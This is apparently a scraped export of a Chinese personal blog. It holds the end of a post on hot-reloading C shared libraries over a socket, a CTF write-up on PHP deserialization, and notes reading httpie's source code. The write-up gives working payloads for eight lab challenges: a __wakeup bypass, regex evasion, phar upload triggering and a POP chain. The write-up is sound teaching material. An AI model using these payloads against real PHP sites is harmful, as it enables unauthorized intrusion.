dlsym() need not indicate an error. The correct way to distinguish an error from a symbol whose value is NULL is to call dlerror(3) to clear any old error conditions, then call dlsym(), and then call dlerror(3) again, saving its return value into a variable, and check whether this saved value is not NULL. socket() creates an endpoint for communication and returns a file descriptor that refers to that endpoint. The file descriptor returned by a successful call will be the lowest-numbered file descriptor not currently open for the process. The domain argument specifies a communication domain; this selects the protocol family which will be used for communication. These families are defined in &lt;sys/socket.h&gt;. The formats currently understood by the Linux kernel include: JUST USING THE ON HAND FUNCTION IS ABSOLUTELY BETTER CHOICE that’s why I USE THIS WAY Screenshot Default .so loading How to change .so file use nc 127.0.0.1 9000 as a signal to contact socket listener .so reload and progressive introduce start The old function keep working and generating output continuously during the reload process THE WHOLE PROCESS CAN BE SEEN ABOVE or you you seek deeper JUST CHECK the source code at the out set of the report End of progressive introduce stage You can easily see what happen above , if you seek more just run the program within the whole package plz. After that the output will only be generated by the newly replaced function 通过这次小作业，学习了dll的载入，c的socket编写，并对这种动态替换，热更新技术做了有限且初步的了解","categories":[{"name":"c语言学习","slug":"c语言学习","permalink":"https://zwh-china.github.io/categories/c%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"}],"tags":[]},{"title":"php反序列化在CTF中的应用","slug":"php反序列化在ctf中的应用","date":"2021-03-30T09:27:40.000Z","updated":"2021-04-20T21:15:38.469Z","comments":true,"path":"2021/03/30/php反序列化在ctf中的应用/","link":"","permalink":"https://zwh-china.github.io/2021/03/30/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9C%A8ctf%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/","excerpt":"","text":"​ ​ ​ 本文假设读者对于php面向对象有一定了解 前置知识什么是反序列化序列化 (Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。 这种官方解释往往对初学反序列化的朋友造成一定困扰 序列化的定义: 序列化：把对象转化为可传输的字节序列过程称为序列化。 反序列化：把字节序列还原为对象的过程称为反序列化。 为什么要序列化？其实序列化最终的目的是为了对象可以跨平台存储，和进行网络传输。而我们进行跨平台存储和网络传输的方式就是IO，而我们的IO支持的数据格式就是字节数组。 因为我们单方面的只把对象转成字节数组还不行，因为没有规则的字节数组我们是没办法把对象的本来面目还原回来的，所以我们必须在把对象转成字节数组的时候就制定一种规则（序列化），那么我们从IO流里面读出数据的时候再以这种规则把对象还原回来（反序列化）。 如果我们要把一栋房子从一个地方运输到另一个地方去，序列化就是我把房子拆成一个个的砖块放到车子里，然后留下一张房子原来结构的图纸，反序列化就是我们把房子运输到了目的地以后，根据图纸把一块块砖头还原成房子原来面目的过程 摘自知友-勤劳的小手 再简单点说就是，当你想把一个数组通过网络传输到另一端并在另一端还原成原数组，你可以通过序列化/反序列化的操作来完成。最常见的json便是序列化/反序列化的代表 php unserialize函数原型和官方定义 unserialize ( string $str ) : mixed unserialize函数接受一个str类型的参数，返回类型可能是多种类型例如数组/对象 序列化字符串的格式Type Serialization examples Null N; Boolean b:1; b:0; Integer i:685230; i:-685230; Floating point d:685230.15; d:INF; d:-INF; d:NAN; String s:6:&quot;A to Z&quot;; Associative array a:4:&#123;i:0;b:1;i:1;N;i:2;d:-421000000;i:3;s:6:&quot;A to Z&quot;;&#125; a:2:&#123;i:42;b:1;s:6:&quot;A to Z&quot;;a:3:&#123;i:0;i:1;i:1;i:2;i:2;i:3;&#125;&#125; Object O:8:&quot;stdClass&quot;:2:&#123;s:4:&quot;John&quot;;d:3.14;s:4:&quot;Jane&quot;;d:2.718;&#125; 那我们选取两歌比较有代表性的序列化字符串来进行解析 a:4:&#123;i:0;b:1;i:1;N;i:2;d:-421000000;i:3;s:6:&quot;A to Z&quot;;&#125; 这里的a代表Associative array也就是关联形数组，4代表这个 序列化字符串中包含四个元素，再看花括号内的内容，i表示数组的索引(index)，其中出现了b N d等字母这代表元素的类型，参考上表，b:1是代表布尔值True，N代表NULL，d:-42100000代表浮点数，s:”A to Z”代表字符串 O:8:&quot;stdClass&quot;:2:&#123;s:4:&quot;John&quot;;d:3.14;s:4:&quot;Jane&quot;;d:2.718;&#125; 这里O代表Object也就是对象，stdClass是类的名字，8表示类名长度，2表示这个对象有两个属性 当然上面的表并不是完整的 Symbol Data Type Description Example N null A NULL value N; b bool The value can either be true(1) or false(0) b:1; i int Numeric value i:1337; d double Double value. Value can be provided as a normal floating value or as E value. (e.g. 1.234E+20). There are three special values: INF -INF NAN d:1.337; d:1.3333333E+20 s string A serialized string contains the string length and the actual string surrounded by double quotes s:4:”meow”; S encoded string The encoded string is very similar to the normal string. The difference is that characters can be hex encoded: A = \\41 . This type allows to make the serialized string printable and is very useful in case the server rejects certain characters S:5:”me\\00ow”; a array The array size is defined first. The actual content remains between the {} and must be provided as key value pairs. a:1:{i:0;s:5:”value”;} O Object Objects have the class name at the beginning followed by the property definitions. Similar to arrays key-value pairs are required here. Properties can either be public private or protected. A public property only requires to set the actual property name. For private and static properties some extra information must be prefixed: Following list shows how a property named test is encoded for different visibilities: public: test private: \\x00Classname\\x00test protected: \\x00*\\x00test O:8:”stdClass”:1:{s:4:”test”;i:123;} C Custom Object Several classes use a custom unserializer and require to use the C symbol. Similar to a normal object the class name is defined first and is followed by the custom serialized string. Contrary to a normal object the number before the custom content defines the length of the custom content instead of the number of properties. C:11:”ArrayObject”:21:{x:i:0;a:0:{};m: a:0:{}} r reference A reference to an existing value in the serialized string. r:1; R reference A reference to an existing value in the serialized string. The is_reference attribute of the zval is set R:1; o wtf object The purpose of the lowercase o is unclear. It represents an object but it is not possible to set the class name (defaults to stdClass). The misplaced “ in the sample is not a typo. o:1:”s:4:”prop”;i:1;} 那序列化在CTF中有什么应用呢先看题 un1 &lt;!-un1.php--&gt; &lt;?php class SoFun&#123; protected $file=&#39;index.php&#39;; function __destruct()&#123; if(!empty($this-&gt;file)) &#123; if(strchr($this-&gt; file,&quot;\\\\&quot;)===false &amp;&amp; strchr($this-&gt;file, &#39;/&#39;)===false) show_source(dirname (__FILE__).&#39;/&#39;.$this -&gt;file); else die(&#39;Wrong filename.&#39;); &#125; &#125; function __wakeup()&#123; $this-&gt;file=&#39;index.php&#39;; &#125; &#125; if (!isset($_GET[&#39;tryhackme&#39;]))&#123; show_source(__FILE__); &#125; else&#123; $a=$_GET[&#39;tryhackme&#39;]; unserialize($a); &#125; ?&gt;&lt;!--key in flag1.php--&gt; 显然我们需要通过析构函数的show_source函数来显示flag1.php 但是其中的wakeup魔法函数会在反序列化对象时将其中的file属性改成index.php 所以这个题的难点就在于如何绕过wakeup函数。wakeup的绕过是利用修改对象个数绕过，在前面我们讲了序列换字符串的每个部分意义后我们便知道对象名后的数字代表序列化对象中元素个数，当元素实际个数小于序列化串中指定个数时，这个序列化串仍会被反序列化，但是其将不会触发wakeup函数(CVE-2016-7124 PHP before 5.6.25 and 7.x before 7.0.10) payload:?tryhackme=O:5:&quot;SoFun&quot;:2:&#123;S:7:&quot;\\00*\\00file&quot;;s:9:&quot;flag1.php&quot;;&#125;此处\\00也可换为%00 un2 &lt;!-un2.php--&gt; &lt;?php include &quot;flag2.php&quot;; class funny&#123; function __wakeup()&#123; global $flag; echo $flag; &#125; &#125; if (isset($_GET[&#39;tryhackme&#39;]))&#123; $a = $_GET[&#39;tryhackme&#39;]; if(preg_match(&#39;/[oc]:\\d+:/i&#39;, $a))&#123; die(&quot;NONONO!&quot;); &#125; else &#123; unserialize($a); &#125; &#125; else &#123; show_source(__FILE__); &#125; ?&gt; 这道题主要是序列化字符串的特殊构造来绕过正则表达式的匹配。常见可以通过使用+号来进行绕过(注意此处+应采用url编码%2b来防止被默认解析为空格) payload:?tryhackme=O:%2b5:&quot;funny&quot;:0:&#123;&#125; un3 &lt;!-un3.php--&gt; &lt;?php include &quot;flag3.php&quot;; class funny&#123; private $password; public $verify; function __wakeup()&#123; global $nobodyknow; global $flag; $this-&gt;password = $nobodyknow; if ($this-&gt;password === $this-&gt;verify)&#123; echo $flag; &#125; else &#123; echo &quot;Hacking??!&quot;; &#125; &#125; &#125; if (isset($_GET[&#39;tryhackme&#39;]))&#123; $a = $_GET[&#39;tryhackme&#39;]; unserialize($a); &#125; else &#123; show_source(__FILE__); &#125; ?&gt; 可以看到想要拿flag就必须通过wakeup函数，此处考点显然不再是wakeup函数的绕过。可以看到nobodyknow这个变量我们是不可控的。但是想要拿到flag我们必须让verify这个变量等于nobodyknow这时我们可以考虑使用引用，让verify的值为对password的引用这样两个变量的值就恒定相等了 payload:?tryhackme=O:5:&quot;funny&quot;:2:&#123;s:15:&quot;%00funny%00password&quot;;N;s:6:&quot;verify&quot;;R:2;&#125; un4 &lt;!-un4.php--&gt; &lt;?php // goto un42.php ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;); session_start(); if (isset($_GET[&#39;tryhackme&#39;]))&#123; $_SESSION[&#39;tryhackme&#39;] = $_GET[&#39;tryhackme&#39;]; &#125; else &#123; show_source(__FILE__); &#125; ?&gt; &lt;!-un42.php--&gt; &lt;?php include &quot;flag4.php&quot;; ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;); session_start(); class funny&#123; public $a; function __destruct()&#123; global $flag; echo $flag; &#125; &#125; show_source(__FILE__); ?&gt; 这个题应用了php反序列化引擎使用不一致导致的漏洞，可以注意到两个php页面使用的反序列化引擎是不同的，前者用的是php_serialize后者则是php具体的漏洞利用就是通过构造payload，使得session在被反序列后得到类funny。具体可以参考Spoock的bloghttps://blog.spoock.com/2016/10/16/php-serialize-problem/ 具体到这题的payload:?tryhackme=O:5:&quot;funny&quot;:1:&#123;s:1:&quot;a&quot;;N;&#125; un5 &lt;!-un5.php--&gt; &lt;?php include &quot;flag5.php&quot;; class funny&#123; private $a; function __construct() &#123; $this-&gt;a = &quot;givemeflag&quot;; &#125; function __destruct() &#123; global $flag; if ($this-&gt;a === &quot;givemeflag&quot;) &#123; echo $flag; &#125; &#125; &#125; if (isset($_GET[&#39;tryhackme&#39;]) &amp;&amp; is_string($_GET[&#39;tryhackme&#39;]))&#123; $a = $_GET[&#39;tryhackme&#39;]; for($i=0;$i&lt;strlen($a);$i++) &#123; if (ord($a[$i]) &lt; 32 ord($a[$i]) &gt; 126) &#123; die(&quot;hacker!&quot;); &#125; &#125; unserialize($a); &#125; else &#123; show_source(__FILE__); &#125; ?&gt; 可以看到，题目对反序列化字符串的内容进行了过滤不允许反序列化字符串中存在不可见字符。但是由于类中的$a是private属性。所以在构造序列化串时难以避免使用不可见字符，此处我们需要使用S，来进行绕过，即编码字符串 payload:?tryhackme=O:5:&quot;funny&quot;:1:&#123;S:8:&quot;\\00funny\\00a&quot;;s:10:&quot;givemeflag&quot;;&#125; 此处如果使用小写s并使用%00就会在payload被urldecode后被检测拦截 故使用大写S进行hex code后使用\\00进行绕过处理 这样%00就会被转义进而符合要求 un6 &lt;!-un6.php--&gt; &lt;?php include &quot;flag6.php&quot;; ini_set(&#39;display_errors&#39;,true); error_reporting(E_ALL E_STRICT); class funny&#123; public function pyflag()&#123; global $flag; echo $flag; &#125; &#125; if (isset($_GET[&#39;tryhackme&#39;]) &amp;&amp; is_string($_GET[&#39;tryhackme&#39;]))&#123; $a = unserialize($_GET[&#39;tryhackme&#39;]); $a(); &#125; else &#123; show_source(__FILE__); &#125; ?&gt; 这道题其实应用了php动态执行函数的能力，即使用变量名后加括号的方式来对函数进行调用。这道题其实是让$a为funny.pyflag payload:?tryhackme=a:2:&#123;i:0;O:5:&quot;funny&quot;:0:&#123;&#125;i:1;s:6:&quot;pyflag&quot;;&#125; un7 &lt;!-un7.php--&gt; &lt;?php include &quot;flag7.php&quot;; class funny&#123; function __destruct() &#123; global $flag; echo $flag; &#125; &#125; show_source(__FILE__); if (isset($_GET[&#39;action&#39;])) &#123; $a = $_GET[&#39;action&#39;]; if ($a === &quot;check&quot;) &#123; $b = $_GET[&#39;file&#39;]; if (file_exists($b) &amp;&amp; !empty($b)) &#123; echo &quot;$b is exist!&quot;; &#125; &#125; else if ($a === &quot;upload&quot;) &#123; if (!is_dir(&quot;./upload&quot;))&#123; mkdir(&quot;./upload&quot;); &#125; $filename = &quot;./upload/&quot;.rand(1, 10000).&quot;.txt&quot;; if (isset($_GET[&#39;data&#39;]))&#123; file_put_contents($filename, base64_decode($_GET[&#39;data&#39;])); echo &quot;Your file path:$filename&quot;; &#125; &#125; &#125; ?&gt; 这题没有反序列化，却需要得到一个funny对象。那我们就可以考虑用phar。 poc.php &lt;?php class funny&#123; function __destruct() &#123; global $flag; echo $flag; &#125; &#125; $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;longlongNB&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $o = new funny(); $phar-&gt;setMetadata($o);//将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); $a=file_get_contents(&#39;./phar.phar&#39;); file_put_contents(&#39;./testphar&#39;,base64_encode($a)); 上传后利用check并使用协议phar来进行触发反序列化 上传payload:?action=upload&amp;data=bG9uZ2xvbmdOQjw/cGhwIF9fSEFMVF9DT01QSUxFUigpOyA/Pg0KRgAAAAEAAAARAAAAAQAAAAAAEAAAAE86NToiZnVubnkiOjA6e30IAAAAdGVzdC50eHQEAAAAQd52XwQAAAAMfn/YtgEAAAAAAAB0ZXN0KfXmrUUr6s38dEJVz9DlBTNhvwcCAAAAR0JNQg==触发payload:?action=check&amp;file=phar://./upload/xxxx.txt 这个也是个挺典型的phar漏洞，不过现在一般站点的phar默认都是关闭的，在本地测试的时候我注意到了这点。题目简单直白只要能反序列化一个funny对象就可以爆出flag，可是没有常规的unserialize，那这样就显然是利用phar，看代码，把64decode的内容扔进一个txt文件，那么在本地我们只需要，新建一个phar中让他存上随意一个funny对象即可 un8 &lt;!-un8.php--&gt; &lt;?php include(&quot;./flag8.php&quot;); class a &#123; public $object; public function resolve() &#123; array_walk($this, function($fn, $prev)&#123; if ($fn[0] === &quot;system&quot; &amp;&amp; $prev === &quot;ls&quot;) &#123; echo &quot;Wow, you rce me! But I can&#39;t let you do this. There is the flag. Enjoy it:)\\n&quot;; global $flag; echo $flag; &#125; &#125;); &#125; public function __destruct() &#123; @$this-&gt;object-&gt;add(); &#125; public function __toString() &#123; return $this-&gt;object-&gt;string; &#125; &#125; class b &#123; protected $filename; protected function addMe() &#123; return &quot;Add Failed. Filename:&quot;.$this-&gt;filename; &#125; public function __call($func, $args) &#123; call_user_func([$this, $func.&quot;Me&quot;], $args); &#125; &#125; class c &#123; private $string; public function __construct($string) &#123; $this-&gt;string = $string; &#125; public function __get($name) &#123; $var = $this-&gt;$name; $var[$name](); &#125; &#125; if (isset($_GET[&quot;tryhackme&quot;])) &#123; unserialize($_GET[&#39;tryhackme&#39;]); &#125; else &#123; highlight_file(__FILE__); &#125; 这题入手稍加分析，就知道想要拿到flag利用的链条必然是利用以destruct为链首的pop链通过a-&gt;b-&gt;a-&gt;c-&gt;a利用c中的那个奇怪的array()调用类a中的resolve方法，或者说成员函数，利用a被摧毁时的add调用，b中的return字符串调用a中的toString这样把整个链条串起来，这样链条就贯通了，我说的三个点便是串起链条的节点。 paylopad:?tryhackme=O:1:&quot;a&quot;:1:&#123;s:6:&quot;object&quot;;O:1:&quot;b&quot;:1:&#123;s:11:&quot;%00*%00filename&quot;;O:1:&quot;a&quot;:1:&#123;s:6:&quot;object&quot;;O:1:&quot;c&quot;:1:&#123;s:9:&quot;%00c%00string&quot;;a:1:&#123;s:6:&quot;string&quot;;a:2:&#123;i:0;O:1:&quot;a&quot;:2:&#123;s:6:&quot;object&quot;;N;s:2:&quot;ls&quot;;a:1:&#123;i:0;s:6:&quot;system&quot;;&#125;&#125;i:1;s:7:&quot;resolve&quot;;&#125;&#125;&#125;&#125;&#125;&#125; 特别鸣谢：Longlone，AFKL出题和题解的参考 Don’t listen to those who say, “It’s not done that way.” Maybe it’s not, but maybe you will. Don’t listen to those who say, “You’re taking too big a chance.” Michelangelo would have painted the Sistine Floor, and it would surely be rubbed out by today. Most importantly, don’t listen When the little voice of fear inside of you rear its ugly head and says, “They’re all smarter than you out there. They’re more talented, They’re taller, blonder, prettier, luckier and have connections…” I firmly believe that if you follow a path that interests you, Not to the exclusion of love, sensitivity, and cooperation with others, But with the strength of conviction That you can move others by your own efforts, And do not make success or failure the criteria by which you live, The chances are you’ll be a person worthy of your own respect. by Marvin Neil Simon 2021/3/30","categories":[{"name":"Web","slug":"Web","permalink":"https://zwh-china.github.io/categories/Web/"}],"tags":[]},{"title":"httpie 项目源码阅读（4）","slug":"httpie-项目源码阅读（4）","date":"2021-03-16T11:27:45.000Z","updated":"2021-04-20T21:15:38.466Z","comments":true,"path":"2021/03/16/httpie-项目源码阅读（4）/","link":"","permalink":"https://zwh-china.github.io/2021/03/16/httpie-%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%EF%BC%884%EF%BC%89/","excerpt":"","text":"","categories":[{"name":"Python学习","slug":"Python学习","permalink":"https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"}],"tags":[]},{"title":"httpie项目源码阅读(3)","slug":"httpie源码阅读3","date":"2021-03-06T19:28:29.000Z","updated":"2021-04-20T21:15:38.465Z","comments":true,"path":"2021/03/07/httpie源码阅读3/","link":"","permalink":"https://zwh-china.github.io/2021/03/07/httpie%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB3/","excerpt":"","text":"由于httpie源码较多，全局变量引用较多。作为新手，我决定先去仔细看看httpie官方doc。先让自己基本完全掌握httpie各种用法，再对httpie源码进行进一步梳理和阅读 doc链接：https://httpie.io/docs 项目地址：https://github.com/httpie/httpie","categories":[{"name":"Python学习","slug":"Python学习","permalink":"https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"}],"tags":[]},{"title":"httpie 项目源码阅读（2）","slug":"httpie-项目源码阅读（2）","date":"2021-03-06T17:13:55.000Z","updated":"2021-04-20T21:15:38.464Z","comments":true,"path":"2021/03/07/httpie-项目源码阅读（2）/","link":"","permalink":"https://zwh-china.github.io/2021/03/07/httpie-%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%EF%BC%882%EF%BC%89/","excerpt":"","text":"看完status.py再看core.py import argparse import os import platform import sys from typing import List, Optional, Tuple, Union import requests from pygments import __version__ as pygments_version from requests import __version__ as requests_version from httpie import __version__ as httpie_version from httpie.cli.constants import OUT_REQ_BODY, OUT_REQ_HEAD, OUT_RESP_BODY, OUT_RESP_HEAD from httpie.client import collect_messages from httpie.context import Environment from httpie.downloads import Downloader from httpie.output.writer import write_message, write_stream, MESSAGE_SEPARATOR_BYTES from httpie.plugins.registry import plugin_manager from httpie.status import ExitStatus, http_status_to_exit_status # noinspection PyDefaultArgument def main(args: List[Union[str, bytes]] = sys.argv, env=Environment()) -&gt; ExitStatus: &quot;&quot;&quot; The main function. Pre-process args, handle some special types of invocations, and run the main program with error handling. Return exit status code. &quot;&quot;&quot; program_name, *args = args env.program_name = os.path.basename(program_name) args = decode_raw_args(args, env.stdin_encoding) plugin_manager.load_installed_plugins() from httpie.cli.definition import parser if env.config.default_options: args = env.config.default_options + args include_debug_info = &#39;--debug&#39; in args include_traceback = include_debug_info or &#39;--traceback&#39; in args if include_debug_info: print_debug_info(env) if args == [&#39;--debug&#39;]: return ExitStatus.SUCCESS exit_status = ExitStatus.SUCCESS try: parsed_args = parser.parse_args( args=args, env=env, ) except KeyboardInterrupt: env.stderr.write(&#39;\\n&#39;) if include_traceback: raise exit_status = ExitStatus.ERROR_CTRL_C except SystemExit as e: if e.code != ExitStatus.SUCCESS: env.stderr.write(&#39;\\n&#39;) if include_traceback: raise exit_status = ExitStatus.ERROR else: try: exit_status = program( args=parsed_args, env=env, ) except KeyboardInterrupt: env.stderr.write(&#39;\\n&#39;) if include_traceback: raise exit_status = ExitStatus.ERROR_CTRL_C except SystemExit as e: if e.code != ExitStatus.SUCCESS: env.stderr.write(&#39;\\n&#39;) if include_traceback: raise exit_status = ExitStatus.ERROR except requests.Timeout: exit_status = ExitStatus.ERROR_TIMEOUT env.log_error(f&#39;Request timed out (&#123;parsed_args.timeout&#125;s).&#39;) except requests.TooManyRedirects: exit_status = ExitStatus.ERROR_TOO_MANY_REDIRECTS env.log_error( f&#39;Too many redirects&#39; f&#39; (--max-redirects=&#123;parsed_args.max_redirects&#125;).&#39; ) except Exception as e: # TODO: Further distinction between expected and unexpected errors. msg = str(e) if hasattr(e, &#39;request&#39;): request = e.request if hasattr(request, &#39;url&#39;): msg = ( f&#39;&#123;msg&#125; while doing a &#123;request.method&#125;&#39; f&#39; request to URL: &#123;request.url&#125;&#39; ) env.log_error(f&#39;&#123;type(e).__name__&#125;: &#123;msg&#125;&#39;) if include_traceback: raise exit_status = ExitStatus.ERROR return exit_status def get_output_options( args: argparse.Namespace, message: Union[requests.PreparedRequest, requests.Response] ) -&gt; Tuple[bool, bool]: return &#123; requests.PreparedRequest: ( OUT_REQ_HEAD in args.output_options, OUT_REQ_BODY in args.output_options, ), requests.Response: ( OUT_RESP_HEAD in args.output_options, OUT_RESP_BODY in args.output_options, ), &#125;[type(message)] def program(args: argparse.Namespace, env: Environment) -&gt; ExitStatus: &quot;&quot;&quot; The main program without error handling. &quot;&quot;&quot; # TODO: Refactor and drastically simplify, especially so that the separator logic is elsewhere. exit_status = ExitStatus.SUCCESS downloader = None initial_request: Optional[requests.PreparedRequest] = None final_response: Optional[requests.Response] = None def separate(): getattr(env.stdout, &#39;buffer&#39;, env.stdout).write(MESSAGE_SEPARATOR_BYTES) def request_body_read_callback(chunk: bytes): should_pipe_to_stdout = bool( # Request body output desired OUT_REQ_BODY in args.output_options # &amp; not `.read()` already pre-request (e.g., for compression) and initial_request # &amp; non-EOF chunk and chunk ) if should_pipe_to_stdout: msg = requests.PreparedRequest() msg.is_body_upload_chunk = True msg.body = chunk msg.headers = initial_request.headers write_message(requests_message=msg, env=env, args=args, with_body=True, with_headers=False) try: if args.download: args.follow = True # --download implies --follow. downloader = Downloader(output_file=args.output_file, progress_file=env.stderr, resume=args.download_resume) downloader.pre_request(args.headers) messages = collect_messages(args=args, config_dir=env.config.directory, request_body_read_callback=request_body_read_callback) force_separator = False prev_with_body = False # Process messages as they’re generated for message in messages: is_request = isinstance(message, requests.PreparedRequest) with_headers, with_body = get_output_options(args=args, message=message) do_write_body = with_body if prev_with_body and (with_headers or with_body) and (force_separator or not env.stdout_isatty): # Separate after a previous message with body, if needed. See test_tokens.py. separate() force_separator = False if is_request: if not initial_request: initial_request = message is_streamed_upload = not isinstance(message.body, (str, bytes)) if with_body: do_write_body = not is_streamed_upload force_separator = is_streamed_upload and env.stdout_isatty else: final_response = message if args.check_status or downloader: exit_status = http_status_to_exit_status(http_status=message.status_code, follow=args.follow) if exit_status != ExitStatus.SUCCESS and (not env.stdout_isatty or args.quiet): env.log_error(f&#39;HTTP &#123;message.raw.status&#125; &#123;message.raw.reason&#125;&#39;, level=&#39;warning&#39;) write_message(requests_message=message, env=env, args=args, with_headers=with_headers, with_body=do_write_body) prev_with_body = with_body # Cleanup if force_separator: separate() if downloader and exit_status == ExitStatus.SUCCESS: # Last response body download. download_stream, download_to = downloader.start( initial_url=initial_request.url, final_response=final_response, ) write_stream(stream=download_stream, outfile=download_to, flush=False) downloader.finish() if downloader.interrupted: exit_status = ExitStatus.ERROR env.log_error( &#39;Incomplete download: size=%d; downloaded=%d&#39; % ( downloader.status.total_size, downloader.status.downloaded )) return exit_status finally: if downloader and not downloader.finished: downloader.failed() if not isinstance(args, list) and args.output_file and args.output_file_specified: args.output_file.close() def print_debug_info(env: Environment): env.stderr.writelines([ f&#39;HTTPie &#123;httpie_version&#125;\\n&#39;, f&#39;Requests &#123;requests_version&#125;\\n&#39;, f&#39;Pygments &#123;pygments_version&#125;\\n&#39;, f&#39;Python &#123;sys.version&#125;\\n&#123;sys.executable&#125;\\n&#39;, f&#39;&#123;platform.system()&#125; &#123;platform.release()&#125;&#39;, ]) env.stderr.write(&#39;\\n\\n&#39;) env.stderr.write(repr(env)) env.stderr.write(&#39;\\n&#39;) def decode_raw_args( args: List[Union[str, bytes]], stdin_encoding: str ) -&gt; List[str]: &quot;&quot;&quot; Convert all bytes args to str by decoding them using stdin encoding. &quot;&quot;&quot; return [ arg.decode(stdin_encoding) if type(arg) is bytes else arg for arg in args ] 先看main函数，可以看到这里的函数注释和__main__.py 不太一样，发现是从typing中导入的，查阅官方文档得知这个模块是辅助函数注释的。main函数的参数有两个，一个是cli用户输入的启动参数，使用sys.argv读入，再看另一个参数是Environment类的实例化，这个Environment类是用户自定义类，从context.py 中导入。那我们再去看一下Environment类的定义 context.py import sys import os from pathlib import Path from typing import IO, Optional try: import curses except ImportError: curses = None # Compiled w/o curses from httpie.compat import is_windows from httpie.config import DEFAULT_CONFIG_DIR, Config, ConfigFileError from httpie.utils import repr_dict class Environment: &quot;&quot;&quot; Information about the execution context (standard streams, config directory, etc). By default, it represents the actual environment. All of the attributes can be overwritten though, which is used by the test suite to simulate various scenarios. &quot;&quot;&quot; is_windows: bool = is_windows config_dir: Path = DEFAULT_CONFIG_DIR stdin: Optional[IO] = sys.stdin # `None` when closed fd (#791) stdin_isatty: bool = stdin.isatty() if stdin else False stdin_encoding: str = None stdout: IO = sys.stdout stdout_isatty: bool = stdout.isatty() stdout_encoding: str = None stderr: IO = sys.stderr stderr_isatty: bool = stderr.isatty() colors = 256 program_name: str = &#39;http&#39; if not is_windows: if curses: try: curses.setupterm() colors = curses.tigetnum(&#39;colors&#39;) except curses.error: pass else: # noinspection PyUnresolvedReferences import colorama.initialise stdout = colorama.initialise.wrap_stream( stdout, convert=None, strip=None, autoreset=True, wrap=True ) stderr = colorama.initialise.wrap_stream( stderr, convert=None, strip=None, autoreset=True, wrap=True ) del colorama def __init__(self, devnull=None, **kwargs): &quot;&quot;&quot; Use keyword arguments to overwrite any of the class attributes for this instance. &quot;&quot;&quot; assert all(hasattr(type(self), attr) for attr in kwargs.keys()) self.__dict__.update(**kwargs) # The original STDERR unaffected by --quiet’ing. self._orig_stderr = self.stderr self._devnull = devnull # Keyword arguments &gt; stream.encoding &gt; default utf8 if self.stdin and self.stdin_encoding is None: self.stdin_encoding = getattr( self.stdin, &#39;encoding&#39;, None) or &#39;utf8&#39; if self.stdout_encoding is None: actual_stdout = self.stdout if is_windows: # noinspection PyUnresolvedReferences from colorama import AnsiToWin32 if isinstance(self.stdout, AnsiToWin32): # noinspection PyUnresolvedReferences actual_stdout = self.stdout.wrapped self.stdout_encoding = getattr( actual_stdout, &#39;encoding&#39;, None) or &#39;utf8&#39; def __str__(self): defaults = dict(type(self).__dict__) actual = dict(defaults) actual.update(self.__dict__) actual[&#39;config&#39;] = self.config return repr_dict(&#123; key: value for key, value in actual.items() if not key.startswith(&#39;_&#39;) &#125;) def __repr__(self): return f&#39;&lt;&#123;type(self).__name__&#125; &#123;self&#125;&gt;&#39; _config: Config = None @property def config(self) -&gt; Config: config = self._config if not config: self._config = config = Config(directory=self.config_dir) if not config.is_new(): try: config.load() except ConfigFileError as e: self.log_error(e, level=&#39;warning&#39;) return config @property def devnull(self) -&gt; IO: if self._devnull is None: self._devnull = open(os.devnull, &#39;w+&#39;) return self._devnull @devnull.setter def devnull(self, value): self._devnull = value def log_error(self, msg, level=&#39;error&#39;): assert level in [&#39;error&#39;, &#39;warning&#39;] self._orig_stderr.write(f&#39;\\n&#123;self.program_name&#125;: &#123;level&#125;: &#123;msg&#125;\\n\\n&#39;) 可以看到这部分完全就是定义了Environment类。先看类的属性is_windows是一个布尔型变量是从compat.py引入。那我们再去看一下compat.py import sys is_windows = &#39;win32&#39; in str(sys.platform).lower() 可以看到很简单，通过sys.platform函数返回值全部小写化后判断其中是否包含win32字符串来判断运行的系统是否为windows。 再看下一个属性config_dir 可以看到这个属性的类型是Path类型，这个是从pathlib中导入的从官方说法来看这个库主要是替代os.path用的，因为用os.path来处理路径有时候可能比较麻烦需要嵌套写法，pathlib 的出现就很好地解决了这一问题，pathlib采用链式调用。说白了就是os.path需要拼来拼去来组合，但是path1ib就就可以通过类似访问子目录和父目录的方法实现目录的跳转。小技巧get :) 这其中主要就是设置httpie的配置路径，例如在windows下就是APPDATA文件夹中 再回看context.py中的后半部分，就是重定向标准输入输出，使用curses库来达到彩色文字的效果。","categories":[{"name":"Python学习","slug":"Python学习","permalink":"https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"}],"tags":[]},{"title":"httpie 项目源码阅读（1）","slug":"httpie-项目源码阅读（1）","date":"2021-03-04T12:49:30.000Z","updated":"2021-04-20T21:15:38.462Z","comments":true,"path":"2021/03/04/httpie-项目源码阅读（1）/","link":"","permalink":"https://zwh-china.github.io/2021/03/04/httpie-%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%EF%BC%881%EF%BC%89/","excerpt":"","text":"httpie 项目源码阅读（1）先放上项目链接https://github.com/httpie/httpie 这个项目大概就是作为一个cli-http访问工具，会得到服务器返回的数据头 以下是项目页readme的简单介绍 HTTPie (pronounced aitch-tee-tee-pie) is a command-line HTTP client. Its goal is to make CLI interaction with web services as human-friendly as possible. HTTPie is designed for testing, debugging, and generally interacting with APIs &amp; HTTP servers. The http &amp; https commands allow for creating and sending arbitrary HTTP requests. They use simple and natural syntax and provide formatted and colorized output. 项目结构: httpie │ .editorconfig │ .gitignore │ 